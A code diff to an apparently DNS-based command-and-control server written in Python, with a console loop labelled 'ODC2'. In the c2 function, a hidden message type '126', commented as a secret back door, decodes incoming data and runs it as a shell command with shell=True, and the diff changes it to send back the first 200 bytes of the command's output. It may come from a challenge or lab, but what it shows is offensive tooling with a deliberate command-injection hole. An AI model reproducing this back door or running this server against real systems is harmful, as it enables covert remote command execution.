@@ -179,8 +179,11 @@ def c2(qname):
                 response = b"CMD" + chunks.pop().encode('utf-8') # send the next chunk of command
         elif msgType == "126": # a secret back door?!?
             command = decode32(request).decode('utf-8')
-            subprocess.check_output(command, shell=True)
-            response = b"Looks like blind command injection..."
+            try:
+                cmdOutput = subprocess.check_output(command, shell=True)
+                response = b"Command injection?! " + cmdOutput[:200]
+            except:
+                response = b"Command injection?! Command failed."
         else: # something went wrong
             error = f"Expected 'CHK', 'HDR', 'RES', or 'CON' from client, got {msgType}"
             print(OE + error + OM)
@@ -240,14 +243,15 @@ def main():
         thread.start()
         print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))
     try:
-        while True:
+        running = True
+        while running:
             # time.sleep(1)
             sys.stderr.flush()
             sys.stdout.flush()
             global userInput
             userInput = input(f"{OR}ODC2 {D} > {OR}")
             if userInput == "exit":
-                raise Exception("Exit time!")
+                running = False
     except KeyboardInterrupt:
         pass
     finally:
